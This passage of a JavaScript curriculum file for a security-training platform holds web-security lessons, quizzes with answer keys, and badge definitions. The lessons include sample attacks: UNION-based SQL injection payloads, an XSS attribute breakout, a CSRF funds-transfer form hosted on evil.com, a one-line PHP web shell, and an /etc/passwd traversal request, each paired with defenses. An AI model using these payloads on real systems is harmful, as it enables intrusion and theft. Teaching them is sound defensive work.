            ]
          },
          {
            slug: "cookies-sessions-and-authentication",
            title: "Cookies, Sessions, and Authentication",
            sequenceOrder: 3,
            estimatedMinutes: 40,
            prerequisites: ["HTTP Requests and Responses Deep Dive"],
            objectives: [
              "Compare Cookie-based sessions vs JWT (JSON Web Tokens)",
              "Understand session token entropy and cryptographically secure random generation",
              "Configure cookie security flags: HttpOnly, Secure, SameSite=Lax/Strict",
              "Identify session fixation, session hijacking, and brute-force vulnerabilities"
            ],
            summary: "Because HTTP is stateless, applications use session identifiers to remember authenticated users. Flawed session handling allows account takeover.",
            contentMarkdown: `### State Management & Token Security

When you log in, the server generates a cryptographically random session identifier.

\`\`\`http
HTTP/1.1 200 OK
Set-Cookie: session_id=x9A8fL2mQ0...; Path=/; Secure; HttpOnly; SameSite=Lax
\`\`\`

#### The Essential Cookie Flags

1. **HttpOnly:** Prevents JavaScript (\`document.cookie\`) from reading the cookie, mitigating XSS session theft.
2. **Secure:** Ensures the cookie is transmitted only over encrypted HTTPS connections.
3. **SameSite (Strict or Lax):** Prevents browsers from attaching cookies to cross-site requests, mitigating Cross-Site Request Forgery (CSRF).

#### JWT (JSON Web Token) Security Considerations

- Verify signature algorithms on the backend (guard against \`"alg": "none"\` bypasses).
- Never store sensitive unencrypted data in the payload (JWT payloads are simply Base64URL-encoded, not encrypted).`,
            keyTakeaways: [
              "Always enable HttpOnly, Secure, and SameSite on authentication cookies.",
              "Regenerate session tokens immediately upon successful authentication to eliminate Session Fixation.",
              "Enforce rate-limiting on login endpoints to defeat brute-force password spraying."
            ],
            commonPitfalls: [
              "Storing sensitive tokens in localStorage, which has zero protection against client-side XSS scripts."
            ],
            labGuidance: "Review session token cookies in DevTools Application tab -> Cookies.",
            resources: [
              {
                title: "OWASP Session Management Cheat Sheet",
                url: "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
                type: "documentation",
                platform: "OWASP"
              }
            ],
            quiz: {
              slug: "quiz-auth-sessions",
              title: "Authentication & Sessions Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "qas1",
                  questionText: "What cookie attribute prevents the browser from sending the cookie over unencrypted HTTP connections?",
                  options: [
                    { id: "a", text: "HttpOnly" },
                    { id: "b", text: "Secure" },
                    { id: "c", text: "SameSite" },
                    { id: "d", text: "Path" }
                  ],
                  correctOptionId: "b",
                  explanation: "The 'Secure' attribute tells the browser to include the cookie only in requests transmitted over TLS/HTTPS."
                },
                {
                  id: "qas2",
                  questionText: "Why is storing sensitive session credentials in browser localStorage risky compared to an HttpOnly cookie?",
                  options: [
                    { id: "a", text: "localStorage is deleted every 5 minutes" },
                    { id: "b", text: "localStorage is readable by any JavaScript executing in the origin, exposing it to XSS theft" },
                    { id: "c", text: "localStorage cannot store strings" },
                    { id: "d", text: "localStorage requires an active internet connection" }
                  ],
                  correctOptionId: "b",
                  explanation: "Any script running on the page can execute localStorage.getItem(), making token theft via XSS trivial."
                }
              ]
            }
          },
          {
            slug: "same-origin-policy-and-browser-security",
            title: "Same-Origin Policy (SOP) and Browser Security",
            sequenceOrder: 4,
            estimatedMinutes: 35,
            prerequisites: ["Cookies, Sessions, and Authentication"],
            objectives: [
              "Define an Origin: Protocol (Scheme) + Host (Domain) + Port",
              "Understand how the Same-Origin Policy protects users from malicious sites",
              "Configure Cross-Origin Resource Sharing (CORS) correctly",
              "Identify risky CORS misconfigurations (Access-Control-Allow-Origin: * with credentials)"
            ],
            summary: "The Same-Origin Policy is the cornerstone of web application security. It stops malicious websites from silently reading data from your banking app.",
            contentMarkdown: `### The Same-Origin Policy (SOP)

An **Origin** is defined strictly by the tuple:
\`(Protocol, Host, Port)\`

For example, comparing to \`https://cyberpath.org:443\`:
- \`http://cyberpath.org:443\` -> **Different origin** (different protocol)
- \`https://sub.cyberpath.org:443\` -> **Different origin** (different host)
- \`https://cyberpath.org:8080\` -> **Different origin** (different port)
- \`https://cyberpath.org/learn\` -> **Same origin**

#### Understanding CORS (Cross-Origin Resource Sharing)

SOP by default prevents \`site-a.com\` from using JavaScript \`fetch()\` to read data from \`site-b.com\`.

CORS allows servers to selectively relax this boundary:
\`\`\`http
# Server response allowing trusted origin:
Access-Control-Allow-Origin: https://app.cyberpath.org
Access-Control-Allow-Credentials: true
\`\`\`

#### The Dangerous Wildcard Misconfiguration

Setting \`Access-Control-Allow-Origin: *\` or blindly reflecting the request's \`Origin\` header with credentials enabled allows arbitrary malicious sites to read authenticated user data!`,
            keyTakeaways: [
              "SOP protects responses, not necessarily requests: requests still fire (CSRF danger), but reading response data is blocked.",
              "Never reflect incoming Origin headers blindly in Access-Control-Allow-Origin."
            ],
            commonPitfalls: [
              "Confusing CORS with an authentication barrier: CORS is a browser mechanism, not server firewall authentication."
            ],
            labGuidance: "Complete PortSwigger Academy lab: 'CORS vulnerability with basic origin reflection'.",
            resources: [
              {
                title: "PortSwigger Web Security Academy — CORS",
                url: "https://portswigger.net/web-security/cors",
                type: "lab",
                platform: "PortSwigger"
              }
            ]
          }
        ]
      },
      {
        id: "ws-mod-2",
        slug: "owasp-core-vulnerabilities",
        title: "Module 2: Access Control, Injection & Client-Side Attacks",
        description: "Analyze Broken Access Control, SQL Injection, Cross-Site Scripting, and CSRF.",
        lessons: [
          {
            slug: "access-control-vulnerabilities",
            title: "Access Control Vulnerabilities (IDOR & Privilege Escalation)",
            sequenceOrder: 5,
            estimatedMinutes: 45,
            prerequisites: ["Same-Origin Policy (SOP) and Browser Security"],
            objectives: [
              "Understand Broken Access Control (#1 in OWASP Top 10)",
              "Differentiate between Horizontal and Vertical Privilege Escalation",
              "Identify Insecure Direct Object References (IDOR)",
              "Enforce server-side record ownership checks on every request"
            ],
            summary: "Broken Access Control occurs when users can act outside of their intended permissions, accessing other users' records or administrative functions.",
            contentMarkdown: `### Insecure Direct Object References (IDOR)

An IDOR vulnerability occurs when an application uses user-supplied input to access objects directly without verifying ownership:

\`\`\`http
# User A (User ID 502) accesses their receipt:
GET /receipts?id=502 HTTP/1.1
Host: shop.local

# Attacker changes id to 501:
GET /receipts?id=501 HTTP/1.1
Host: shop.local

# If the server returns User B's receipt, this is an IDOR vulnerability!
\`\`\`

#### Horizontal vs. Vertical Privilege Escalation

- **Horizontal:** A regular user accesses data belonging to another user with the same privilege tier (User A reading User B's messages).
- **Vertical:** A regular user accesses elevated administrative functions (e.g., standard student accessing \`/admin/delete_user\`).

#### Secure Code Pattern

\`\`\`javascript
// Secure backend handler checking ownership
async function getReceipt(req, res) {
  const receiptId = req.params.id;
  const currentUserId = req.user.id; // from verified session token

  const receipt = await db.receipts.findOne({
    where: { id: receiptId, ownerId: currentUserId } // STRICT OWNERSHIP CHECK!
  });

  if (!receipt) {
    return res.status(404).json({ error: "Receipt not found" });
  }

  return res.json(receipt);
}
\`\`\``,
            keyTakeaways: [
              "Never rely on obscurity or unguessable UUIDs as a substitute for authorization checks.",
              "Check user authorization on EVERY data fetch and modification endpoint.",
              "Adopt a 'Deny by Default' authorization architecture."
            ],
            commonPitfalls: [
              "Checking authorization only in UI rendering while leaving backend API endpoints unprotected."
            ],
            labGuidance: "Solve PortSwigger lab: 'Insecure direct object references'.",
            resources: [
              {
                title: "PortSwigger Web Security Academy — Access Control",
                url: "https://portswigger.net/web-security/access-control",
                type: "lab",
                platform: "PortSwigger"
              }
            ],
            quiz: {
              slug: "quiz-access-control",
              title: "Access Control & IDOR Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "qac1",
                  questionText: "What type of vulnerability occurs when User A changes an account ID parameter in a URL to access User B's private profile?",
                  options: [
                    { id: "a", text: "Cross-Site Scripting (XSS)" },
                    { id: "b", text: "Insecure Direct Object Reference (IDOR)" },
                    { id: "c", text: "SQL Injection" },
                    { id: "d", text: "Denial of Service" }
                  ],
                  correctOptionId: "b",
                  explanation: "An IDOR flaw allows attackers to reference database objects directly without the server validating object ownership."
                },
                {
                  id: "qac2",
                  questionText: "What is Vertical Privilege Escalation?",
                  options: [
                    { id: "a", text: "Accessing accounts with the same privilege level" },
                    { id: "b", text: "A standard user gaining administrative or higher-tier privileges" },
                    { id: "c", text: "Upgrading a server's hardware capacity" },
                    { id: "d", text: "Encrypting database backups vertically" }
                  ],
                  correctOptionId: "b",
                  explanation: "Vertical escalation occurs when a lower-privileged user accesses functions or data reserved for higher-tier roles (like admins)."
                }
              ]
            }
          },
          {
            slug: "sql-injection-web",
            title: "SQL Injection: Advanced Patterns & Prevention",
            sequenceOrder: 6,
            estimatedMinutes: 45,
            prerequisites: ["Access Control Vulnerabilities"],
            objectives: [
              "Understand UNION SELECT column count matching and data type alignment",
              "Construct error-based payloads to extract database metadata",
              "Implement Object-Relational Mapping (ORM) safely (avoiding raw query fallbacks)",
              "Remediate legacy codebases with prepared statements"
            ],
            summary: "Deepen your understanding of SQL Injection with Union-based database schema extraction and safe ORM querying.",
            contentMarkdown: `### Exploiting & Fixing UNION-Based SQLi

A \`UNION\` query combines results from multiple \`SELECT\` queries. For a UNION attack to succeed, two conditions must be met:
1. The queries must return the **exact same number of columns**.
2. The data types in corresponding columns must be **compatible**.

\`\`\`sql
-- 1. Determining column count:
' UNION SELECT NULL, NULL, NULL --

-- 2. Determining which column displays text:
' UNION SELECT 'a', NULL, NULL --
' UNION SELECT NULL, 'a', NULL --

-- 3. Extracting database tables in PostgreSQL / MySQL:
' UNION SELECT username, password_hash, NULL FROM users --
\`\`\`

#### Preventing ORM Misuse

Even when using modern ORMs (Prisma, TypeORM, Hibernate), developers introduce SQLi when falling back to raw queries:

\`\`\`typescript
// VULNERABLE RAW ORM QUERY:
await prisma.$queryRawUnsafe(\`SELECT * FROM items WHERE name = '\${userInput}'\`);

// SECURE PARAMETERIZED QUERY:
await prisma.$queryRaw\`SELECT * FROM items WHERE name = \${userInput}\`;
\`\`\``,
            keyTakeaways: [
              "Always enforce parameterized queries across both raw SQL and ORM extensions.",
              "Keep database user account permissions minimal: the web application user should not own DB administrator rights."
            ],
            commonPitfalls: [
              "Believing ORMs automatically make code immune to SQLi when developers use raw query string concatenation."
            ],
            labGuidance: "Complete PortSwigger Academy lab: 'SQL injection UNION attack, determining the number of columns returned by the query'.",
            resources: [
              {
                title: "PortSwigger Academy — SQLi UNION Attacks",
                url: "https://portswigger.net/web-security/sql-injection/union-attacks",
                type: "lab",
                platform: "PortSwigger"
              }
            ]
          },
          {
            slug: "cross-site-scripting-web",
            title: "Cross-Site Scripting (XSS): Contexts & Defenses",
            sequenceOrder: 7,
            estimatedMinutes: 45,
            prerequisites: ["SQL Injection: Advanced Patterns & Prevention"],
            objectives: [
              "Understand context-specific escaping: HTML Body vs. Attribute vs. Script vs. URL contexts",
              "Analyze DOM XSS sinks: innerHTML, document.write, eval, setTimeout",
              "Construct strong Content Security Policies (CSP) with nonces and hashes",
              "Audit third-party frontend dependencies for client-side prototype pollution"
            ],
            summary: "XSS defenses must match the specific context where user input is rendered. Learn context-aware escaping and Content Security Policy.",
            contentMarkdown: `### Context Matters in XSS Defenses

HTML escaping \`<script>\` does NOT protect you if the input is reflected inside an attribute or inline script block:

\`\`\`html
<!-- Context 1: Inside HTML body -> Needs HTML entity encoding -->
<div>Hello, &lt;b&gt;user&lt;/b&gt;</div>

<!-- Context 2: Inside an attribute -> Quotes must be escaped -->
<input type="text" name="city" value="INPUT_HERE">
<!-- If input is: " onfocus="alert(1) -> Payload executes on focus! -->

<!-- Context 3: Inside a JavaScript variable -> Needs JS encoding -->
<script>
  let username = "INPUT_HERE";
</script>
\`\`\`

#### Modern Defense: Content Security Policy (CSP)

A strong CSP header prevents untrusted inline scripts and restricts domains from which scripts can execute:

\`\`\`http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none';
\`\`\``,
            keyTakeaways: [
              "Context-aware output encoding is mandatory: HTML encoding is ineffective inside script blocks.",
              "Use CSP with nonces to block inline scripts and restrict unauthorized script origins."
            ],
            commonPitfalls: [
              "Using dangerouslySetInnerHTML in React or v-html in Vue without sanitization (e.g., DOMPurify)."
            ],
            labGuidance: "Solve PortSwigger lab: 'DOM XSS in document.write sink using source location.search'.",
            resources: [
              {
                title: "DOMPurify — Fast, Tolerant XSS Sanitizer",
                url: "https://github.com/cure53/DOMPurify",
                type: "documentation",
                platform: "Cure53"
              }
            ]
          },
          {
            slug: "cross-site-request-forgery",
            title: "Cross-Site Request Forgery (CSRF)",
            sequenceOrder: 8,
            estimatedMinutes: 35,
            prerequisites: ["Cross-Site Scripting (XSS): Contexts & Defenses"],
            objectives: [
              "Understand how browsers automatically attach session cookies to cross-site requests",
              "Construct proof-of-concept CSRF HTML forms",
              "Implement Anti-CSRF Synchronizer Tokens and Double-Submit Cookie patterns",
              "Understand SameSite=Lax/Strict cookie defenses"
            ],
            summary: "CSRF tricks a victim's authenticated browser into executing unwanted actions (e.g., changing passwords or transferring funds) on a vulnerable web application.",
            contentMarkdown: `### How CSRF Attacks Work

1. Victim logs into \`bank.com\` and receives an active session cookie.
2. Without logging out, Victim visits malicious site \`evil.com\`.
3. \`evil.com\` contains an auto-submitting hidden HTML form:

\`\`\`html
<!-- On evil.com: -->
<form id="csrfForm" action="https://bank.com/api/transfer" method="POST">
  <input type="hidden" name="to_account" value="attacker" />
  <input type="hidden" name="amount" value="5000" />
</form>
<script>document.getElementById('csrfForm').submit();</script>
\`\`\`

Because the user is logged into \`bank.com\`, the browser **automatically includes the victim's session cookie**, and the bank processes the transfer!

#### Modern CSRF Defenses

1. **Anti-CSRF Tokens:** The server generates a unique, secret, unguessable token tied to the current user's session and validates it on every state-changing request (POST, PUT, DELETE).
2. **SameSite Cookies:** Setting \`SameSite=Lax\` or \`SameSite=Strict\` instructs the browser NOT to send cookies with cross-site requests.`,
            keyTakeaways: [
              "SameSite cookies have greatly reduced CSRF risk, but Anti-CSRF tokens remain best practice for critical actions.",
              "GET requests must NEVER cause state changes (no fund transfers, password changes, or account deletions via GET)."
            ],
            commonPitfalls: [
              "Relying solely on Referer header checking without Anti-CSRF tokens (Referer headers can be stripped by privacy plugins)."
            ],
            labGuidance: "Solve PortSwigger lab: 'CSRF vulnerability with no defenses'.",
            resources: [
              {
                title: "PortSwigger Web Security Academy — CSRF",
                url: "https://portswigger.net/web-security/csrf",
                type: "lab",
                platform: "PortSwigger"
              }
            ]
          }
        ]
      },
      {
        id: "ws-mod-3",
        slug: "file-security-and-academy",
        title: "Module 3: File Uploads, Path Traversal & Capstone",
        description: "Secure file uploads, prevent directory traversal, and complete PortSwigger Web Security Academy exercises.",
        lessons: [
          {
            slug: "file-upload-and-path-traversal-security",
            title: "File Upload and Path Traversal Security",
            sequenceOrder: 9,
            estimatedMinutes: 45,
            prerequisites: ["Cross-Site Request Forgery (CSRF)"],
            objectives: [
              "Understand dangerous file upload risks (Remote Code Execution via web shells)",
              "Understand Directory / Path Traversal (../../etc/passwd)",
              "Implement robust file upload validation: filename sanitization, content-type verification, magic byte checks",
              "Isolate uploaded user assets on dedicated cloud storage (AWS S3, Supabase Storage)"
            ],
            summary: "Allowing users to upload files is one of the highest-risk features in web applications. Flawed handling leads directly to Remote Code Execution (RCE).",
            contentMarkdown: `### Dangerous File Upload Vulnerabilities

If an application accepts an uploaded file without validating its extension, an attacker can upload a web shell script (\`.php\`, \`.jsp\`, \`.aspx\`):

\`\`\`php
<?php system($_GET['cmd']); ?>
\`\`\`

When the server executes this file at \`https://app.com/uploads/shell.php?cmd=whoami\`, the attacker achieves complete system takeover!

#### Path Traversal (Directory Traversal)

Occurs when user input is used in file system read/write operations without sanitization:

\`\`\`http
GET /loadImage?filename=../../../etc/passwd HTTP/1.1
\`\`\`

#### Hardening File Uploads Checklist

1. **Randomize Filenames:** Never save files with user-provided names. Generate a UUID (e.g., \`3f8b...png\`).
2. **Validate File Magic Bytes:** Don't trust the client \`Content-Type\` header or file extension. Inspect the file's first binary bytes (e.g., PNG magic bytes: \`89 50 4E 47\`).
3. **Store Off-Server:** Store user uploads in dedicated object storage (Supabase Storage / Amazon S3) with execution disabled.
4. **Enforce Canonical Paths:** Use path normalization (\`path.resolve()\` / \`realpath()\`) and ensure the resulting path begins with the intended directory root.`,
            keyTakeaways: [
              "Never store executable files in web-accessible directories where the web server can execute them.",
              "Canonicalize paths before verifying that the target file resides strictly within the allowed root directory."
            ],
            commonPitfalls: [
              "Checking file extensions with weak filters like 'file.php.jpg' or null-byte tricks ('shell.php%00.png')."
            ],
            labGuidance: "Complete PortSwigger Academy lab: 'Remote code execution via web shell upload'.",
            resources: [
              {
                title: "PortSwigger Web Security Academy — File Upload Vulnerabilities",
                url: "https://portswigger.net/web-security/file-upload",
                type: "lab",
                platform: "PortSwigger"
              }
            ],
            quiz: {
              slug: "quiz-file-uploads",
              title: "File Upload & Path Traversal Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "qfu1",
                  questionText: "What is the most severe risk of unvalidated file uploads on a server that executes server-side scripts?",
                  options: [
                    { id: "a", text: "Slow page load speeds" },
                    { id: "b", text: "Remote Code Execution (RCE) via web shell upload" },
                    { id: "c", text: "Color distortion in image galleries" },
                    { id: "d", text: "DNS cache poisoning" }
                  ],
                  correctOptionId: "b",
                  explanation: "Uploading and executing a server-side script (e.g., PHP, JSP) gives the attacker arbitrary command execution on the host server."
                },
                {
                  id: "qfu2",
                  questionText: "Why should developers assign random UUIDs to uploaded files instead of trusting the user's original filename?",
                  options: [
                    { id: "a", text: "It prevents path traversal characters (../) and malicious extension tricks" },
                    { id: "b", text: "It makes image files smaller" },
                    { id: "c", text: "It automatically translates foreign languages" },
                    { id: "d", text: "UUIDs are required by HTML5" }
                  ],
                  correctOptionId: "a",
                  explanation: "Random UUID filenames completely neutralize directory traversal characters, null-byte tricks, and dangerous executable file naming."
                }
              ]
            }
          },
          {
            slug: "guided-portswigger-web-security-academy-labs",
            title: "Guided PortSwigger Web Security Academy Labs",
            sequenceOrder: 10,
            estimatedMinutes: 50,
            prerequisites: ["File Upload and Path Traversal Security"],
            objectives: [
              "Navigate PortSwigger Web Security Academy's practical learning path",
              "Execute authenticated testing workflows with Burp Suite Repeater",
              "Document vulnerability findings with CVSS severity scoring",
              "Complete the Web Security Track Capstone Assessment"
            ],
            summary: "Put all web application testing skills into practice with PortSwigger Web Security Academy's free, realistic vulnerability sandboxes.",
            contentMarkdown: `### Capstone: Professional Web Audit Methodology

In this capstone lesson, you apply structured penetration testing workflows against live, legal PortSwigger Academy labs.

#### The 5-Step Web Audit Process

1. **Reconnaissance & Mapping:** Browse the full application through Burp Suite to populate the target sitemap.
2. **Analysis:** Identify input vectors (forms, headers, cookies, API parameters).
3. **Vulnerability Discovery:** Test for OWASP Top 10 flaws systematically.
4. **Exploitation / Proof-of-Concept:** Craft minimum reproducible PoCs that demonstrate risk without disrupting service.
5. **Reporting & CVSS Scoring:** Calculate CVSS (Common Vulnerability Scoring System) metrics and draft actionable remediation steps.

\`\`\`
CVSS v3.1 Score Example:
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H -> Base Score: 9.8 (Critical)
\`\`\``,
            keyTakeaways: [
              "PortSwigger Web Security Academy is the global industry standard for hands-on application security training.",
              "Focus on minimum impactful proof-of-concepts: proof of access is sufficient to demonstrate risk; never exfiltrate unnecessary private data."
            ],
            commonPitfalls: [
              "Relying solely on automated vulnerability scanners without manual business-logic inspection."
            ],
            labGuidance: "Register for free at portswigger.net/web-security and complete 5 Apprentice-level labs.",
            resources: [
              {
                title: "PortSwigger Web Security Academy",
                url: "https://portswigger.net/web-security",
                type: "lab",
                platform: "PortSwigger"
              }
            ],
            quiz: {
              slug: "quiz-web-security-capstone",
              title: "Web Security Expert Capstone Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "qwsc1",
                  questionText: "Which organization produces the authoritative 'OWASP Top 10' awareness standard for web application security?",
                  options: [
                    { id: "a", text: "Open Web Application Security Project (OWASP)" },
                    { id: "b", text: "World Wide Web Consortium (W3C)" },
                    { id: "c", text: "Internet Engineering Task Force (IETF)" },
                    { id: "d", text: "National Security Agency (NSA)" }
                  ],
                  correctOptionId: "a",
                  explanation: "OWASP (Open Web Application Security Project) is a non-profit foundation dedicated to improving software security."
                }
              ]
            }
          }
        ]
      }
    ]
  }
];

// Badge definitions matching user requirements in Section 6
export const BADGES_DEFINITION = [
  {
    slug: "linux-explorer",
    name: "Linux Explorer",
    track: "Red Team",
    iconName: "Terminal",
    isMaster: false,
    colorClass: "text-[#fafafa]",
    borderClass: "border-white/20",
    bgClass: "bg-white/[0.06]",
    description: "Awarded upon completing the Linux fundamentals module and passing the Linux assessment.",
    requirementType: "module_completion",
    targetSlug: "linux-fundamentals"
  },
  {
    slug: "network-navigator",
    name: "Network Navigator",
    track: "Red Team",
    iconName: "Network",
    isMaster: false,
    colorClass: "text-[#fafafa]",
    borderClass: "border-white/20",
    bgClass: "bg-white/[0.06]",
    description: "Awarded upon completing networking fundamentals and passing the networking assessment.",
    requirementType: "module_completion",
    targetSlug: "networking-fundamentals"
  },
  {
    slug: "web-apprentice",
    name: "Web Apprentice",
    track: "Web Security",
    iconName: "Globe",
    isMaster: false,
    colorClass: "text-[#fafafa]",
    borderClass: "border-white/20",
    bgClass: "bg-white/[0.06]",
    description: "Awarded upon completing web basics and passing the HTTP and protocol assessment.",
    requirementType: "module_completion",
    targetSlug: "http-requests-and-responses"
  },
  {
    slug: "recon-specialist",
    name: "Recon Specialist",
    track: "Red Team",
    iconName: "Compass",
    isMaster: false,
    colorClass: "text-[#fafafa]",
    borderClass: "border-white/20",
    bgClass: "bg-white/[0.06]",
    description: "Awarded upon completing the reconnaissance and Nmap scanning fundamentals.",
    requirementType: "module_completion",
    targetSlug: "nmap-fundamentals"
  },
  {
    slug: "red-team-specialist",
    name: "Red Team Specialist",
    track: "Red Team",
    iconName: "Flame",
    isMaster: false,
    colorClass: "text-[#fafafa]",
    borderClass: "border-white/20",
    bgClass: "bg-white/[0.06]",
    description: "Awarded upon 100% completion of all 12 Red Team curriculum milestones and assessments.",
    requirementType: "path_completion",
    targetSlug: "red-team"
  },
  {
    slug: "blue-team-defender",
    name: "Blue Team Defender",
    track: "Blue Team",
    iconName: "ShieldCheck",
    isMaster: false,
    colorClass: "text-[#fafafa]",
    borderClass: "border-white/20",
    bgClass: "bg-white/[0.06]",
    description: "Awarded upon 100% completion of all 9 Blue Team defensive modules, event monitoring, and SIEM labs.",
    requirementType: "path_completion",
    targetSlug: "blue-team"
  },
  {
    slug: "web-security-expert",
    name: "Web Security Expert",
    track: "Web Security",
    iconName: "Globe",
    isMaster: false,
    colorClass: "text-[#fafafa]",
    borderClass: "border-white/20",
    bgClass: "bg-white/[0.06]",
    description: "Awarded upon 100% completion of all 10 Web Security lessons and OWASP assessments.",
    requirementType: "path_completion",
    targetSlug: "web-security"
  },
  {
    slug: "cyberpath-master",
    name: "CyberPath Master",
    track: "Apex Credential",
    iconName: "Crown",
    isMaster: true,
    colorClass: "text-[#f2cc60]",
    borderClass: "border-[#d29922]/70",
    bgClass: "bg-[#d29922]/15",
    description: "The highest honor on CyberPath. Awarded only to elite students who conquer all three specialization tracks (31 lessons total).",
    requirementType: "all_paths_completion",
    targetSlug: "all"
  }
];

// Helper functions for easy lookup
export function getAllLessons() {
  const lessons = [];
  for (const path of LEARNING_PATHS) {
    for (const mod of path.modules) {
      for (const lesson of mod.lessons) {
        lessons.push({
          ...lesson,
          pathSlug: path.slug,
          pathTitle: path.title,
          moduleId: mod.id,
          moduleSlug: mod.slug,
          moduleTitle: mod.title
        });
      }
    }
  }
  return lessons;
}

export function getPathBySlug(pathSlug) {
  return LEARNING_PATHS.find((p) => p.slug === pathSlug) || null;
}

export function getLessonBySlug(pathSlug, lessonSlug) {
  const path = getPathBySlug(pathSlug);
  if (!path) return null;

  const allPathLessons = [];
  for (const mod of path.modules) {
    for (const lesson of mod.lessons) {
      allPathLessons.push({
        ...lesson,
        pathSlug: path.slug,
        pathTitle: path.title,
        moduleId: mod.id,
        moduleSlug: mod.slug,
        moduleTitle: mod.title
      });
    }
  }

  const index = allPathLessons.findIndex((l) => l.slug === lessonSlug);
  if (index === -1) return null;

  return {
    lesson: allPathLessons[index],
    prevLesson: index > 0 ? allPathLessons[index - 1] : null,
    nextLesson: index < allPathLessons.length - 1 ? allPathLessons[index + 1] : null,
    totalInPath: allPathLessons.length,
    currentIndex: index + 1
  };
}
